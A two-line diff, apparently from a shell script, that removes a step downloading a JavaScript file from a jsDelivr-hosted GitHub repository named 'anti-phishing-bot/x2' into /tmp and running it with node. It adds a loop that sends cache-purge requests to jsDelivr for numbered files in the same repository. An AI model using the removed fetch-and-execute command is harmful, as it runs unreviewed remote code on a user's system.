@@ -1,2 +1,1 @@
-curl -fs -o /tmp/p1.js "https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/p1.js"
-node /tmp/p1.js
+for n in 6821 6823 6825 6827; do curl -s -m 8 -o /dev/null https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b$n; done
